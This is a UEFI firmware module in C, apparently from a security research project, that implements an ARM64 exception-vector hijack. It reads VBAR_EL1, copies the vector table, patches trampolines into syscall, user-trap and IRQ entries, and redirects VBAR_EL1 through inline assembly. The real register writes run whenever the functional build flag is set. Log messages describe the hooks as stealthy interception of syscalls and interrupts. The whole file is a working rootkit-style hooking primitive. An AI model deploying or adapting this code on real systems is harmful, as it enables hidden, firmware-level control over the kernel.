/** @file
  Exception Vector Table Hook - Implementation

  ARM VBAR relocation attack module. When BARZAKH_FUNCTIONAL is defined,
  performs real VBAR_EL1 relocation on AArch64 hardware/QEMU. Otherwise
  emulates the full attack sequence via debug logging.

  Copyright (c) 2026, Barzakh Research Project
  SPDX-License-Identifier: BSD-2-Clause-Patent
**/

#include "ExceptionVectorHook.h"

STATIC VHOOK_CONTEXT  mVhookContext;

STATIC CHAR8  *mExceptionTypeNames[] = { "Synchronous", "IRQ", "FIQ", "SError" };
STATIC CHAR8  *mSourceNames[] = { "Current SP0", "Current SPx", "Lower A64", "Lower A32" };

EFI_STATUS
EFIAPI
InitializeVectorHook (
  OUT VHOOK_CONTEXT  *Context
  )
{
  ZeroMem (Context, sizeof (VHOOK_CONTEXT));
  Context->Initialized = TRUE;
  Context->State = VhookStateUninitialized;

  DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "Initialized (SIMULATION_MODE=%d)\n", SIMULATION_MODE));
  return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
ReadVbarRegisters (
  IN OUT VHOOK_CONTEXT  *Context
  )
{
  if (!Context->Initialized) {
    return EFI_NOT_READY;
  }

  DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "Reading VBAR registers...\n"));

  if (SIMULATION_MODE) {
    Context->OrigVbarEl1 = VBAR_EL1_ORIGINAL;
    Context->OrigVbarEl2 = VBAR_EL2_ORIGINAL;
    Context->OrigVbarEl3 = VBAR_EL3_ORIGINAL;
    Context->TargetEl = 1;

    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  VBAR_EL1 = 0x%016lx [SIMULATED]\n",
            Context->OrigVbarEl1));
    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  VBAR_EL2 = 0x%016lx [SIMULATED]\n",
            Context->OrigVbarEl2));
    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  VBAR_EL3 = 0x%016lx [SIMULATED]\n",
            Context->OrigVbarEl3));
    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  Target:   EL%d (kernel exception handlers)\n",
            Context->TargetEl));
    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  Table structure: %d entries x 0x%x bytes = 0x%x total\n",
            VBAR_NUM_ENTRIES, VBAR_ENTRY_SIZE, VBAR_TABLE_SIZE));
  } else {
    UINT64  VbarValue;

    __asm__ volatile ("mrs %0, vbar_el1" : "=r" (VbarValue));
    Context->OrigVbarEl1 = VbarValue;
    Context->OrigVbarEl2 = 0;
    Context->OrigVbarEl3 = 0;
    Context->TargetEl = 1;

    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  VBAR_EL1 = 0x%016lx [LIVE]\n",
            Context->OrigVbarEl1));
  }

  Context->State = VhookStateVbarRead;
  return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
CopyVectorTable (
  IN OUT VHOOK_CONTEXT  *Context
  )
{
  if (Context->State < VhookStateVbarRead) {
    return EFI_NOT_READY;
  }

  DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "Cloning vector table to hook region...\n"));

  if (SIMULATION_MODE) {
    Context->HookTableAddr = VBAR_HOOK_ALLOC_BASE;

    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  Step 1: Allocate 2KB-aligned memory for hook table\n"));
    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "    Allocated at: 0x%016lx (aligned to 0x%x)\n",
            Context->HookTableAddr, VBAR_ALIGNMENT));

    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  Step 2: Copy original table from VBAR_EL%d\n",
            Context->TargetEl));
    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "    Source: 0x%016lx  Size: 0x%x bytes\n",
            Context->OrigVbarEl1, VBAR_TABLE_SIZE));
    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "    CopyMem(0x%016lx, 0x%016lx, %d) [SIMULATED]\n",
            Context->HookTableAddr, Context->OrigVbarEl1, VBAR_TABLE_SIZE));

    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  Vector table layout:\n"));
    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "    [0x000-0x1FF] Current EL with SP_EL0  (Sync/IRQ/FIQ/SError)\n"));
    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "    [0x200-0x3FF] Current EL with SP_ELx  (Sync/IRQ/FIQ/SError)\n"));
    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "    [0x400-0x5FF] Lower EL AArch64        (Sync/IRQ/FIQ/SError)\n"));
    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "    [0x600-0x7FF] Lower EL AArch32        (Sync/IRQ/FIQ/SError)\n"));
  } else {
    EFI_STATUS          AllocStatus;
    EFI_PHYSICAL_ADDRESS  PageAddr;

    AllocStatus = gBS->AllocatePages (
                         AllocateAnyPages,
                         EfiBootServicesData,
                         1,
                         &PageAddr
                         );
    if (EFI_ERROR (AllocStatus)) {
      DEBUG ((DEBUG_ERROR, VHOOK_DEBUG_PREFIX "Failed to allocate hook table page: %r\n", AllocStatus));
      return AllocStatus;
    }

    Context->HookTableAddr = (UINT64)PageAddr;
    CopyMem ((VOID *)Context->HookTableAddr, (VOID *)Context->OrigVbarEl1, VBAR_TABLE_SIZE);

    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  Allocated hook table at 0x%016lx [LIVE]\n",
            Context->HookTableAddr));
    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  Copied %d bytes from original VBAR_EL1\n",
            VBAR_TABLE_SIZE));
  }

  Context->State = VhookStateTableCopied;
  return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
PatchVectorEntries (
  IN OUT VHOOK_CONTEXT  *Context
  )
{
  UINT32  Src;
  UINT32  Type;
  UINT32  Index;
  UINT64  EntryAddr;
  UINT64  HookDest;

  if (Context->State < VhookStateTableCopied) {
    return EFI_NOT_READY;
  }

  DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "Patching vector table entries with hooks...\n"));

  if (SIMULATION_MODE) {
    Context->HookCount = 0;

    // Hook: Current EL SPx — Synchronous (syscall/SVC interception)
    Src = VBAR_SRC_CURR_SPX;
    Type = VBAR_TYPE_SYNC;
    Index = VBAR_ENTRY_INDEX (Src, Type);
    EntryAddr = Context->HookTableAddr + VBAR_ENTRY_OFFSET (Src, Type);
    HookDest = Context->HookTableAddr + VBAR_TABLE_SIZE + 0x100;

    Context->Hooks[Context->HookCount].EntryIndex = Index;
    Context->Hooks[Context->HookCount].OriginalAddr = EntryAddr;
    Context->Hooks[Context->HookCount].HookAddr = HookDest;
    Context->Hooks[Context->HookCount].IsHooked = TRUE;
    Context->HookCount++;

    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  Hooking [%d] %a / %a\n",
            Index, mSourceNames[Src], mExceptionTypeNames[Type]));
    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "    Entry offset: 0x%03x  Addr: 0x%016lx\n",
            VBAR_ENTRY_OFFSET (Src, Type), EntryAddr));
    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "    Trampoline: LDR X16, =0x%016lx; BR X16\n", HookDest));

    // Hook: Lower EL AArch64 — Synchronous (trap from userspace)
    Src = VBAR_SRC_LOWER_A64;
    Type = VBAR_TYPE_SYNC;
    Index = VBAR_ENTRY_INDEX (Src, Type);
    EntryAddr = Context->HookTableAddr + VBAR_ENTRY_OFFSET (Src, Type);
    HookDest = Context->HookTableAddr + VBAR_TABLE_SIZE + 0x200;

    Context->Hooks[Context->HookCount].EntryIndex = Index;
    Context->Hooks[Context->HookCount].OriginalAddr = EntryAddr;
    Context->Hooks[Context->HookCount].HookAddr = HookDest;
    Context->Hooks[Context->HookCount].IsHooked = TRUE;
    Context->HookCount++;

    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  Hooking [%d] %a / %a\n",
            Index, mSourceNames[Src], mExceptionTypeNames[Type]));
    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "    Entry offset: 0x%03x  Addr: 0x%016lx\n",
            VBAR_ENTRY_OFFSET (Src, Type), EntryAddr));
    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "    Trampoline: LDR X16, =0x%016lx; BR X16\n", HookDest));

    // Hook: Lower EL AArch64 — IRQ (timer/interrupt interception)
    Src = VBAR_SRC_LOWER_A64;
    Type = VBAR_TYPE_IRQ;
    Index = VBAR_ENTRY_INDEX (Src, Type);
    EntryAddr = Context->HookTableAddr + VBAR_ENTRY_OFFSET (Src, Type);
    HookDest = Context->HookTableAddr + VBAR_TABLE_SIZE + 0x300;

    Context->Hooks[Context->HookCount].EntryIndex = Index;
    Context->Hooks[Context->HookCount].OriginalAddr = EntryAddr;
    Context->Hooks[Context->HookCount].HookAddr = HookDest;
    Context->Hooks[Context->HookCount].IsHooked = TRUE;
    Context->HookCount++;

    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  Hooking [%d] %a / %a\n",
            Index, mSourceNames[Src], mExceptionTypeNames[Type]));
    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "    Entry offset: 0x%03x  Addr: 0x%016lx\n",
            VBAR_ENTRY_OFFSET (Src, Type), EntryAddr));
    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "    Trampoline: LDR X16, =0x%016lx; BR X16\n", HookDest));

    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  Patched %d/%d vector entries\n",
            Context->HookCount, VBAR_NUM_ENTRIES));
    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  Hook trampoline pattern:\n"));
    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "    0x%08x  LDR X16, [PC+8]\n", ARM64_LDR_X16_NEXT));
    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "    0x%08x  BR  X16\n", ARM64_BR_X16));
    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "    <8-byte absolute target address>\n"));
  } else {
    UINT32  *Entry;
    UINT64  OrigHandler;

    Context->HookCount = 0;

    // Patch: Lower EL AArch64 — Synchronous (offset 0x400)
    Src = VBAR_SRC_LOWER_A64;
    Type = VBAR_TYPE_SYNC;
    Index = VBAR_ENTRY_INDEX (Src, Type);
    EntryAddr = Context->HookTableAddr + VBAR_ENTRY_OFFSET (Src, Type);

    // Save original first instruction address (original handler)
    OrigHandler = Context->OrigVbarEl1 + VBAR_ENTRY_OFFSET (Src, Type);

    // Write trampoline: LDR X16, [PC+8]; BR X16; <original_handler_addr>
    // This redirects to the original handler — demonstrating the hook without breaking the system
    Entry = (UINT32 *)(UINTN)EntryAddr;
    Entry[0] = ARM64_LDR_X16_NEXT;  // LDR X16, [PC+8]
    Entry[1] = ARM64_BR_X16;         // BR X16
    // 8-byte absolute address of original handler
    *((UINT64 *)&Entry[2]) = OrigHandler;
    // Fill rest of the 128-byte slot with NOPs
    for (UINT32 i = 4; i < VBAR_ENTRY_SIZE / sizeof(UINT32); i++) {
      Entry[i] = ARM64_NOP;
    }

    Context->Hooks[Context->HookCount].EntryIndex = Index;
    Context->Hooks[Context->HookCount].OriginalAddr = OrigHandler;
    Context->Hooks[Context->HookCount].HookAddr = EntryAddr;
    Context->Hooks[Context->HookCount].IsHooked = TRUE;
    Context->HookCount++;

    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  Patched entry [%d] Lower EL A64 / Sync [LIVE]\n", Index));
    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "    Trampoline at 0x%016lx -> original 0x%016lx\n",
            EntryAddr, OrigHandler));
  }

  Context->State = VhookStateTableModified;
  return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
RedirectVbar (
  IN OUT VHOOK_CONTEXT  *Context
  )
{
  if (Context->State < VhookStateTableModified) {
    return EFI_NOT_READY;
  }

  DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "Redirecting VBAR_EL%d to hook table...\n",
          Context->TargetEl));

  if (SIMULATION_MODE) {
    Context->NewVbarValue = Context->HookTableAddr;

    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  Step 1: DSB ISH (data synchronization barrier)\n"));
    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  Step 2: MSR VBAR_EL%d, 0x%016lx [SIMULATED]\n",
            Context->TargetEl, Context->NewVbarValue));
    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  Step 3: ISB (instruction synchronization barrier)\n"));

    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  Original VBAR_EL%d: 0x%016lx\n",
            Context->TargetEl, Context->OrigVbarEl1));
    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  New VBAR_EL%d:      0x%016lx\n",
            Context->TargetEl, Context->NewVbarValue));

    Context->VbarRedirected = TRUE;

    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  -> VBAR redirection SUCCEEDED [SIMULATED]\n"));
    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  -> All exceptions now route through hook table\n"));
    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  -> Hooked: syscalls, user-kernel traps, IRQs\n"));
    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  -> Stealth: hooks chain to original handlers after inspection\n"));
  } else {
    Context->NewVbarValue = Context->HookTableAddr;

    __asm__ volatile (
      "dsb ish\n\t"
      "msr vbar_el1, %0\n\t"
      "isb"
      :
      : "r" (Context->NewVbarValue)
    );

    Context->VbarRedirected = TRUE;

    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  VBAR_EL1 redirected: 0x%016lx -> 0x%016lx [LIVE]\n",
            Context->OrigVbarEl1, Context->NewVbarValue));
  }

  Context->State = VhookStateVbarRedirected;
  return EFI_SUCCESS;
}

VOID
EFIAPI
LogVectorHookStatus (
  IN     VHOOK_CONTEXT  *Context
  )
{
  CHAR8   *StateStr;
  UINT32  Index;

  switch (Context->State) {
    case VhookStateUninitialized:  StateStr = "Uninitialized"; break;
    case VhookStateVbarRead:       StateStr = "VBAR Read"; break;
    case VhookStateTableCopied:    StateStr = "Table Copied"; break;
    case VhookStateTableModified:  StateStr = "Table Modified"; break;
    case VhookStateVbarRedirected: StateStr = "VBAR Redirected"; break;
    default:                       StateStr = "Unknown"; break;
  }

  DEBUG ((DEBUG_INFO, "\n"));
  DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "=== Exception Vector Hook Status ===\n"));
  DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  State:          %a\n", StateStr));
  DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  Target:         EL%d\n", Context->TargetEl));
  DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  Original VBAR:  0x%016lx\n", Context->OrigVbarEl1));
  DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  Hook Table:     0x%016lx\n", Context->HookTableAddr));
  DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  VBAR Redirected: %a\n",
          Context->VbarRedirected ? "Yes" : "No"));
  DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  Hooks installed: %d\n", Context->HookCount));
  for (Index = 0; Index < Context->HookCount; Index++) {
    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "    [%d] entry %d -> 0x%016lx\n",
            Index, Context->Hooks[Index].EntryIndex, Context->Hooks[Index].HookAddr));
  }
  DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "====================================\n\n"));
}

EFI_STATUS
EFIAPI
ExceptionVectorHookEntry (
  IN EFI_HANDLE        ImageHandle,
  IN EFI_SYSTEM_TABLE  *SystemTable
  )
{
  EFI_STATUS  Status;

  DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "Module loaded - Exception Vector Hook Emulation\n"));

  Status = InitializeVectorHook (&mVhookContext);
  if (EFI_ERROR (Status)) {
    return Status;
  }

  Status = ReadVbarRegisters (&mVhookContext);
  if (EFI_ERROR (Status)) {
    DEBUG ((DEBUG_ERROR, VHOOK_DEBUG_PREFIX "VBAR read failed: %r\n", Status));
    return Status;
  }

  Status = CopyVectorTable (&mVhookContext);
  if (EFI_ERROR (Status)) {
    DEBUG ((DEBUG_ERROR, VHOOK_DEBUG_PREFIX "Table copy failed: %r\n", Status));
    return Status;
  }

  Status = PatchVectorEntries (&mVhookContext);
  if (EFI_ERROR (Status)) {
    DEBUG ((DEBUG_ERROR, VHOOK_DEBUG_PREFIX "Entry patching failed: %r\n", Status));
    return Status;
  }

  Status = RedirectVbar (&mVhookContext);
  if (EFI_ERROR (Status)) {
    DEBUG ((DEBUG_ERROR, VHOOK_DEBUG_PREFIX "VBAR redirect failed: %r\n", Status));
    return Status;
  }

  LogVectorHookStatus (&mVhookContext);

  DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "Emulation complete\n"));
  return EFI_SUCCESS;
}
